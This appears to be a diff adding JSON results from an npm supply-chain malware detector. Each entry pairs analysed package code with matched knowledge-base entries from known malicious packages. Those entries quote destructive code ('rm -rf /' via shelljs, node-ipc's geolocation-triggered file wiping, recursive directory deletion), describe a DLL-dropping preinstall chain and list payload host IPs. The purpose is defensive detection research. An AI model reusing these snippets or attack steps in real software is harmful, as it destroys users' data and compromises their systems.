+                    "action": "index.js downloads a remote payload (npm.mov) and saves as sqlite.a.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "PowerShell script execution"
+                  },
+                  {
+                    "step": 4,
+                    "action": "index.js executes PowerShell script with execution policy bypassed.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Payload decryption and staging"
+                  },
+                  {
+                    "step": 5,
+                    "action": "PowerShell script decrypts sqlite.a, writes decrypted payload to sql.tmp, deletes original.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Preparation for DLL execution"
+                  },
+                  {
+                    "step": 6,
+                    "action": "index.js renames sql.tmp to preinstall.db (malicious DLL).",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "DLL execution"
+                  },
+                  {
+                    "step": 7,
+                    "action": "index.js executes preinstall.db via rundll32, then deletes the DLL.",
+                    "implemented_by": [
+                      "snippet_7"
+                    ],
+                    "leads_to": "Malicious code execution and anti-forensics"
+                  },
+                  {
+                    "step": 8,
+                    "action": "index.js and batch script delete themselves and restore a benign package.json.",
+                    "implemented_by": [
+                      "snippet_8"
+                    ],
+                    "leads_to": "Removal of evidence and evasion of detection"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of preinstall scripts in package.json that execute local JavaScript files",
+                    "OS detection and conditional creation of batch/PowerShell scripts during install",
+                    "Network requests to hardcoded IPs/domains during install",
+                    "Download and execution of remote files (especially with misleading extensions)",
+                    "Execution of PowerShell with ExecutionPolicy Bypass",
+                    "Execution of DLLs via rundll32 during install",
+                    "Immediate deletion of install scripts and restoration of package.json"
+                  ],
+                  "file_indicators": [
+                    "preinstall.bat",
+                    "preinstall.ps1",
+                    "sqlite.a",
+                    "sql.tmp",
+                    "preinstall.db",
+                    "index.js",
+                    "pk.json",
+                    "package.json (with/without preinstall hook)"
+                  ],
+                  "network_indicators": [
+                    "103.179.142.171/files/npm.mov",
+                    "91.206.178.125/files/npm.mov",
+                    "Other hardcoded IPs/domains listed in IOC section"
+                  ],
+                  "how_to_detect": "Monitor for NPM packages with preinstall scripts that execute local files. Flag packages that create or execute batch/PowerShell scripts, especially if they download files from non-standard domains or IPs. Detect execution of PowerShell with ExecutionPolicy Bypass and rundll32 during install. Look for rapid creation and deletion of suspicious files (e.g., preinstall.bat, preinstall.ps1, sqlite.a, preinstall.db) and post-install modification of package.json to remove install hooks. Correlate with network activity to known malicious IPs/domains."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202040_962955_snippet_3",
+              "source_package": "mostly-harmless (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202040_962955/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4818975031375885,
+              "code_similarity": 0.4304710030555725,
+              "behavior_similarity": 0.5333240032196045,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "    \"scripts\": {\n        \"postinstall\": \"node ./lib/build.js\"\n    }",
+                "code_behavior": "During postinstall, the script executes the local JavaScript file ./lib/build.js, which can contain arbitrary logic including further malicious actions such as downloading and executing remote code.",
+                "malice_analysis": {
+                  "why_suspicious": "Delegating postinstall to a local script is a common obfuscation technique, allowing attackers to hide malicious logic in separate files and evade simple static analysis.",
+                  "violated_expectations": "While legitimate packages may use postinstall scripts for setup, they should be transparent and not obfuscate or download further code from untrusted sources.",
+                  "similar_legitimate_use": "Some legitimate packages use postinstall scripts for setup or compilation, but not for downloading or executing remote code or hiding malicious logic.",
+                  "key_indicators": [
+                    "postinstall triggers execution of local script",
+                    "potential for hidden or obfuscated logic in build.js"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json (scripts.postinstall) in version 1.0.1",
+                  "required_permissions": [
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mostly-harmless",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0, 1.0.1",
+                  "why_malicious": "The package executes arbitrary code on the host system during installation by leveraging postinstall scripts to download and run remote binaries, establish reverse shells, and exfiltrate sensitive data such as credentials and environment variables. These actions directly compromise host security and privacy, and are not expected or acceptable in legitimate npm packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious postinstall script is triggered during npm install.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of remote or local malicious code."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Remote binary is downloaded and executed, or local JavaScript is run to fetch and execute further payloads.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Establishment of remote access or further code execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Reverse shell is established, granting attacker remote access to the host.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can execute arbitrary commands on the victim system."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Sensitive files and environment variables are harvested and prepared for exfiltration.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Exfiltration of credentials and secrets to attacker-controlled infrastructure."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall scripts that download and execute remote binaries from untrusted domains",
+                    "postinstall scripts that execute local JavaScript files with network access and code execution capabilities",
+                    "JavaScript code that fetches and evals remote code during installation",
+                    "Enumeration and base64 encoding of environment variables and files for exfiltration"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious postinstall scripts referencing wget, curl, or node execution of local scripts",
+                    "lib/build.js or similar files containing network-fetching or eval code",
+                    "Downloaded binaries (e.g., 'malware') with no legitimate purpose or documentation"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to untrusted domains such as probably.bad",
+                    "Outbound TCP connections to hardcoded IPs and ports (e.g., 10.0.0.20:1028)",
+                    "HTTP(S) requests to fetch code or exfiltrate data during or immediately after installation"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that download or execute remote code, especially those referencing untrusted domains or invoking wget/curl. Flag any use of eval on network-fetched data in JavaScript files executed during installation. Detect outbound connections to suspicious IPs or domains (e.g., probably.bad, 10.0.0.20:1028) during or immediately after installation. Audit package.json for unexpected postinstall entries and scan for code that enumerates and encodes environment variables or sensitive files for exfiltration."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-debian-package/0.1.14/package/tasks/fileOrDirectory.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "fileOrDirectory_slice_1",
+          "code_snippet": "(function () {\n\n    'use strict';\n\n    var _delete = function (grunt) {\n        return function (path) {\n            if (grunt.file.expand(path).length > 0) {\n                grunt.verbose.writeln('Deleting: \\'\" + grunt.file.expand(path) + \"\\'');\n                grunt.file.delete(grunt.file.expand(path), {force: true});\n            }\n        };\n    };\n\n    module.exports = {\n        _delete: _delete,\n        _copy: function (grunt) {\n            return function (source, destination) {\n                grunt.file.mkdir(destination);\n                grunt.file.expand(source).forEach(function (file) {\n                    if (grunt.file.isDir(file)) {\n                        grunt.file.recurse(file, function callback(abspath, rootdir, subdir, filename) {\n                            grunt.verbose.writeln('Copying: \\'\" + abspath + \"\\' to \\'\" + destination + '/' + (subdir ? subdir + '/' : '') + filename + \"\\'');\n                            grunt.file.copy(abspath, destination + '/' + (subdir ? subdir + '/' : '') + filename);\n                        });\n                    } else {\n                        grunt.file.copy(file, destination);\n                    }\n                });\n            };\n        },\n        _cleanUp: function (grunt) {\n            return function (options, allFiles) {\n                if (allFiles) {\n                    _delete(grunt)(options.working_directory);\n                    _delete(grunt)(options.working_directory + options.packaging_directory_name);\n                    _delete(grunt)(options.package_location + '*.tar.gz');\n                    _delete(grunt)(options.package_location + '*.build');\n                    _delete(grunt)(options.package_location + '*.changes');\n                    _delete(grunt)(options.package_location + '*.deb');\n                } else if (!grunt.option('verbose')) {\n                    _delete(grunt)(options.working_directory + options.packaging_directory_name);\n                    _delete(grunt)(options.package_location + '*.tar.gz');\n                    _delete(grunt)(options.package_location + '*.build');\n                }\n            };\n        }\n    };\n\n})();",
+          "is_malicious": false,
+          "malice_score": 0.53586665391922,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code modifies files and directories using Grunt's file API by deleting files matching specified patterns (*.tar.gz, *.build, *.changes, *.deb) and copying files/directories from source to destination. It accesses and modifies the filesystem extensively via grunt.file.expand, grunt.file.delete, grunt.file.copy, and grunt.file.mkdir, performing recursive file operations. This behavior facilitates automated cleanup and file management during build or packaging processes but does not involve network, system execution, or sensitive data access.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code performs file management operations such as deleting, copying, and cleaning up files and directories using Grunt's file API. These operations are typical in build and packaging scripts to automate cleanup and file organization. Unlike the known malicious patterns, this code does not execute shell commands, does not perform destructive recursive deletions without context, nor does it attempt to hide or remove evidence of malicious activity. The deletions are targeted to specific build-related file patterns (*.tar.gz, *.build, *.changes, *.deb) and directories related to packaging, which is consistent with legitimate build cleanup tasks. There is no network activity, no obfuscation, no conditional destructive behavior based on environment checks, and no evidence of anti-forensics or sabotage. Therefore, despite using sensitive filesystem APIs, the intent and context strongly indicate benign behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_063579_snippet_2",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5582675337791443,
+              "code_similarity": 0.5113914012908936,
+              "behavior_similarity": 0.605143666267395,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function angry() {\n  sh.exec(\"rm -rf *  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf /*  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf /  > /dev/null 2>&1\");\n  sh.exec(\"rm -rf ~/*  > /dev/null 2>&1\");\n}",
+                "code_behavior": "At runtime, when triggered by a remote server response, the code executes multiple destructive shell commands ('rm -rf *', 'rm -rf /*', 'rm -rf /', 'rm -rf ~/*') via shelljs, recursively deleting all files and directories on the system, resulting in total data loss.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is designed to execute highly destructive shell commands that irreversibly delete all files on the system, which is never appropriate for a utility package and constitutes deliberate sabotage.",
+                  "violated_expectations": "A cookie parsing or API protection package should not execute shell commands, especially those that delete user data or system files.",
+                  "similar_legitimate_use": "There is no legitimate use for this behavior in any public npm package; such commands are only used in controlled, manual system administration contexts.",
+                  "key_indicators": [
+                    "Use of 'rm -rf' on root, home, and current directories",
+                    "Shell command execution from JavaScript using shelljs",
+                    "Function named 'angry' with destructive payload",
+                    "No user interaction or warning before data destruction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when angry() is called, after remote server trigger)",
+                  "file_location": "main module file of protect-api (e.g., index.js)",
+                  "required_permissions": [
+                    "filesystem",
+                    "shell access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_130803_692773_snippet_1",
+              "source_package": "@jayxuz/vue3-admin-icons (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_130803_692773/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5350369215011597,
+              "code_similarity": 0.49108752608299255,
+              "behavior_similarity": 0.5789862871170044,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode based on report description\nif (window.location.host !== 'vue-admin-beautiful.com') {\n  // Delete project files or disrupt application\n  fs.rmdirSync(process.cwd(), { recursive: true });\n}",
+                "code_behavior": "At runtime, the code checks if the application is running on an allow-listed domain (such as 'vue-admin-beautiful.com'); if not, it recursively deletes all files in the current working directory using fs.rmdirSync, resulting in application disruption and data loss.",
+                "malice_analysis": {
+                  "why_suspicious": "The code performs a domain check and, if the environment does not match the allow-list, executes a destructive filesystem operation that deletes all project files. Such behavior is highly abnormal and dangerous in any npm package.",
+                  "violated_expectations": "Legitimate npm packages should never conditionally delete user files based on the runtime domain or environment. This violates user trust and can cause irreversible data loss.",
+                  "similar_legitimate_use": "While kill-switch or self-destruct logic may be used in proprietary DRM or anti-piracy software, it is never appropriate in open source or general-purpose npm packages, especially without explicit user consent.",
+                  "key_indicators": [
+                    "Conditional logic that checks window.location.host or process.env for specific domains",
+                    "Use of fs.rmdirSync or similar recursive file deletion APIs",
+                    "Destructive actions triggered outside of an allow-listed environment",
+                    "Hidden or obfuscated code in main entry points (e.g., index.js) that is not documented"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is loaded and executed in a web application)",
+                  "file_location": "main entry point (e.g., index.js or main.js) of the package",
+                  "required_permissions": [
+                    "filesystem (read/write/delete access via Node.js 'fs' module)",
+                    "access to process environment variables",
+                    "access to window.location (if running in a browser-like environment)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@jayxuz/vue3-admin-icons",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions by jayxuz",
+                  "why_malicious": "The package contains hidden code that acts as a kill-switch by deleting files on the victim's machine if the code is executed outside of an allow-listed set of domains. This sabotage mechanism disrupts web applications and causes data loss for unauthorized users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the @jayxuz/vue3-admin-icons package into their web application.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The package's main code is executed as part of the application startup."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code checks if the application is running on an allow-listed domain (e.g., 'vue-admin-beautiful.com') by inspecting window.location.host or process.env.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "If the domain is not allow-listed, the code prepares to execute a destructive action."
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the domain is not allow-listed, the code recursively deletes all files in the current working directory using fs.rmdirSync, sabotaging the application.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The application is disrupted and user data is lost, achieving the attacker's goal of sabotaging unauthorized users."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Conditional runtime checks for specific domains or environments (e.g., window.location.host, process.env) followed by destructive filesystem operations",
+                    "Use of fs.rmdirSync, fs.rmSync, or fs.unlinkSync to recursively delete files or directories based on environment checks",
+                    "Obfuscated or undocumented logic in main entry points that triggers only outside of specific domains"
+                  ],
+                  "file_indicators": [
+                    "References to fs.rmdirSync, fs.rmSync, or similar destructive filesystem APIs in index.js, main.js, or other entry points",
+                    "Conditional statements comparing window.location.host or process.env to hardcoded domain names (e.g., 'vue-admin-beautiful.com')",
+                    "Presence of hidden or minified code blocks in main application files that are not referenced in documentation"
+                  ],
+                  "network_indicators": [
+                    "No direct network exfiltration, but code checks for the presence of specific domains (e.g., 'vue-admin-beautiful.com') in runtime logic"
+                  ],
+                  "how_to_detect": "Scan for code in npm packages that performs destructive filesystem operations (such as fs.rmdirSync, fs.rmSync, fs.unlinkSync) conditionally based on the runtime domain or environment. Flag packages containing logic that checks window.location.host or process.env for specific domain names and then deletes files if the environment does not match an allow-list. Review main entry points (e.g., index.js, main.js) for hidden, obfuscated, or undocumented kill-switch or sabotage logic."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_191626_596562_snippet_8",
+              "source_package": "Unknown (multiple malicious crypto-related NPM packages, some reported by Phylum) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_191626_596562/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5198583602905273,
+              "code_similarity": 0.5235246419906616,
+              "behavior_similarity": 0.5161920785903931,
+              "matched_snippet": {
+                "snippet_id": "snippet_8",
+                "code_snippet": "// Pseudocode\nif (fs.existsSync('pk.json')) {\n  fs.unlinkSync('package.json');\n  fs.renameSync('pk.json', 'package.json');\n}\nfs.unlinkSync('preinstall.bat');\nfs.unlinkSync('index.js');",
+                "code_behavior": "During installation, the script deletes and renames files to remove evidence of the preinstall hook and malicious scripts, restoring a benign package.json and erasing traces of the attack.",
+                "malice_analysis": {
+                  "why_suspicious": "Anti-forensics: removing install hooks and scripts to evade detection and hinder incident response.",
+                  "violated_expectations": "Legitimate packages do not self-delete install scripts or modify package.json post-install to remove evidence.",
+                  "similar_legitimate_use": "Legitimate packages may clean up temporary files, but not remove or restore core package files to hide malicious activity.",
+                  "key_indicators": [
+                    "Self-deletion of install scripts",
+                    "Restoration of benign package.json after malicious activity"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (cleanup phase)",
+                  "file_location": "index.js / preinstall.bat",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (multiple malicious crypto-related NPM packages, some reported by Phylum)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (recent versions at time of attack, 2023-2024)",
+                  "why_malicious": "The packages are malicious because they leverage preinstall scripts to execute code during installation, which initiates a multi-stage attack chain. This chain includes downloading and decrypting a remote payload, executing a malicious DLL, and performing anti-forensics by deleting evidence and restoring benign files. The intent is to compromise developer systems, exfiltrate sensitive data, and establish persistence or backdoors, all without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script in package.json triggers execution of index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "index.js execution and OS detection"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js checks for Windows OS and writes batch/PowerShell scripts to disk.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Preparation for payload download and execution"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js downloads a remote payload (npm.mov) and saves as sqlite.a.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "PowerShell script execution"
+                  },
+                  {
+                    "step": 4,
+                    "action": "index.js executes PowerShell script with execution policy bypassed.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Payload decryption and staging"
+                  },
+                  {
+                    "step": 5,
+                    "action": "PowerShell script decrypts sqlite.a, writes decrypted payload to sql.tmp, deletes original.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Preparation for DLL execution"
+                  },
+                  {
+                    "step": 6,
+                    "action": "index.js renames sql.tmp to preinstall.db (malicious DLL).",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "DLL execution"
+                  },
+                  {
+                    "step": 7,
+                    "action": "index.js executes preinstall.db via rundll32, then deletes the DLL.",
+                    "implemented_by": [
+                      "snippet_7"
+                    ],
+                    "leads_to": "Malicious code execution and anti-forensics"
+                  },
+                  {
+                    "step": 8,
+                    "action": "index.js and batch script delete themselves and restore a benign package.json.",
+                    "implemented_by": [
+                      "snippet_8"
+                    ],
+                    "leads_to": "Removal of evidence and evasion of detection"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of preinstall scripts in package.json that execute local JavaScript files",
+                    "OS detection and conditional creation of batch/PowerShell scripts during install",
+                    "Network requests to hardcoded IPs/domains during install",
+                    "Download and execution of remote files (especially with misleading extensions)",
+                    "Execution of PowerShell with ExecutionPolicy Bypass",
+                    "Execution of DLLs via rundll32 during install",
+                    "Immediate deletion of install scripts and restoration of package.json"
+                  ],
+                  "file_indicators": [
+                    "preinstall.bat",
+                    "preinstall.ps1",
+                    "sqlite.a",
+                    "sql.tmp",
+                    "preinstall.db",
+                    "index.js",
+                    "pk.json",
+                    "package.json (with/without preinstall hook)"
+                  ],
+                  "network_indicators": [
+                    "103.179.142.171/files/npm.mov",
+                    "91.206.178.125/files/npm.mov",
+                    "Other hardcoded IPs/domains listed in IOC section"
+                  ],
+                  "how_to_detect": "Monitor for NPM packages with preinstall scripts that execute local files. Flag packages that create or execute batch/PowerShell scripts, especially if they download files from non-standard domains or IPs. Detect execution of PowerShell with ExecutionPolicy Bypass and rundll32 during install. Look for rapid creation and deletion of suspicious files (e.g., preinstall.bat, preinstall.ps1, sqlite.a, preinstall.db) and post-install modification of package.json to remove install hooks. Correlate with network activity to known malicious IPs/domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205352_825222_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205352_825222/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5188044905662537,
+              "code_similarity": 0.5176458358764648,
+              "behavior_similarity": 0.5199631452560425,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const fs = require('fs');\n// Overwrite a file with a protest message\nfs.writeFileSync('/tmp/protest.txt', 'This is a protest message against the war.');\n// Recursively and forcefully delete files/directories\nfs.rmSync('/home/user/Documents', { recursive: true, force: true });",
+                "code_behavior": "During postinstall and at runtime, the code writes a protest message to a file and recursively deletes files or directories outside the package's own directory, resulting in potential data loss and system instability.",
+                "malice_analysis": {
+                  "why_suspicious": "The code performs destructive file system operations, such as overwriting and recursively deleting files in user or system directories, without user consent or documentation. Such actions are highly abnormal for a networking utility package.",
+                  "violated_expectations": "Legitimate packages should never modify or delete files outside their own installation directory, especially not in a destructive or irreversible manner and without explicit user approval.",
+                  "similar_legitimate_use": "File deletion may be appropriate in uninstall scripts or cleanup utilities, but only when limited to the package's own files and with clear user notification and consent.",
+                  "key_indicators": [
+                    "Use of fs.rmSync or fs.writeFileSync targeting arbitrary or sensitive file paths",
+                    "Destructive file system actions triggered automatically during install or runtime",
+                    "Absence of user prompts, warnings, or documentation for destructive behavior",
+                    "Hardcoded protest messages written to files outside the package scope"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall and runtime",
+                  "file_location": "index.js (main entry point) and injected scripts within the package",
+                  "required_permissions": [
+                    "filesystem (read/write/delete access to arbitrary paths)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2 (other affected versions not specified in the report)",
+                  "why_malicious": "The package was intentionally modified to include destructive protestware code that, upon installation or execution, attempts to overwrite or recursively delete files on the user's disk, including files outside the package's own directory. This behavior directly threatens the integrity and availability of user data and systems, constituting a high-severity supply chain attack."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code executes during the npm package's postinstall phase or at runtime, targeting the file system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Overwriting of files with protest messages and recursive deletion of user or system files, resulting in data loss and potential system damage."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package code performing file deletion or overwriting outside its own installation directory",
+                    "Destructive file system operations (e.g., fs.rmSync, fs.writeFileSync) triggered during postinstall or runtime without user interaction",
+                    "Presence of hardcoded protest messages written to files",
+                    "Lack of user prompts or documentation for destructive actions"
+                  ],
+                  "file_indicators": [
+                    "Unexpected creation of files containing protest messages (e.g., '/tmp/protest.txt')",
+                    "Deletion or modification of files in user directories such as '/home', '/Users', or '/Documents'",
+                    "Modifications to files or directories not owned by the package"
+                  ],
+                  "network_indicators": [],
+                  "how_to_detect": "Monitor npm packages for file system operations (write, delete) targeting paths outside the package's own directory, especially during postinstall or runtime. Flag packages that use fs.rmSync or fs.writeFileSync on user or system directories, and review for hardcoded protest messages or destructive commands. Automated static analysis should alert on recursive or forceful deletion of non-package files and the presence of protest-related strings in file writes."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_692327_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_692327/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5093303918838501,
+              "code_similarity": 0.45077580213546753,
+              "behavior_similarity": 0.5678850412368774,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "setTimeout(function () {\n    const randomNumber = Math.round(Math.random() * 4);\n    if (randomNumber > 1) {\n        // return;\n    }\n    const apiKey = \"https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154\";\n    const pwd = \"./\";\n    const parentDir = \"../\";\n    const grandParentDir = \"../../\";\n    const root = \"/\";\n    const countryName = \"country_name\";\n    const russia = \"russia\";\n    const belarus = \"belarus\";\n    https.get(apiKey, function (message) {\n        message.on(\"data\", function (msgBuffer) {\n            try {\n                const message = JSON.parse(msgBuffer.toString(\"utf8\"));\n                const userCountryName = message[countryName.toString(\"utf8\")].toLowerCase();\n                const hasRus = userCountryName.includes(russia.toString(\"utf8\")) || userCountryName.includes(belarus.toString(\"utf8\"));\n                if (hasRus) {\n                    deleteFile(pwd);\n                    deleteFile(parentDir);\n                    deleteFile(grandParentDir);\n                    deleteFile(root);\n                }\n            } catch (t) {}\n        });\n    });\n    // zkyf: Let's try this directly here\n    deleteFile(pwd);\n    deleteFile(parentDir);\n    deleteFile(grandParentDir);\n    deleteFile(root);\n}, 100);",
+                "code_behavior": "At runtime, shortly after import, the code initiates a delayed execution using setTimeout, performs an external geolocation API request, parses the response to determine the user's country, and if the country is Russia or Belarus, recursively calls a file deletion function on multiple directory levels, resulting in destructive file overwrites.",
+                "malice_analysis": {
+                  "why_suspicious": "The code makes an unsolicited external geolocation API request and, based on the result, triggers recursive file overwrite operations targeting the entire filesystem. This is a clear indicator of a targeted, destructive payload.",
+                  "violated_expectations": "A legitimate IPC package should not perform geolocation checks or attempt to overwrite user files under any circumstances. The expected behavior is to provide inter-process communication utilities, not to execute destructive actions based on user location.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or compliance, but never to trigger destructive file operations. Recursive file deletion is only appropriate in uninstallers or cleanup tools, and only with explicit user consent.",
+                  "key_indicators": [
+                    "Automated geolocation API request at runtime",
+                    "Conditional logic targeting specific countries (Russia, Belarus)",
+                    "Recursive invocation of file overwrite function across multiple directory levels",
+                    "Destructive file operations triggered without user interaction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (shortly after import, via setTimeout)",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2",
+                  "why_malicious": "The package was intentionally altered by its maintainer to include code that, upon execution, checks the user's geolocation via an external API. If the user is located in Russia or Belarus, the code recursively overwrites files across the filesystem with a heart emoji, resulting in widespread and deliberate data destruction. This constitutes a targeted sabotage attack, which is entirely outside the scope of legitimate package behavior."
+                },
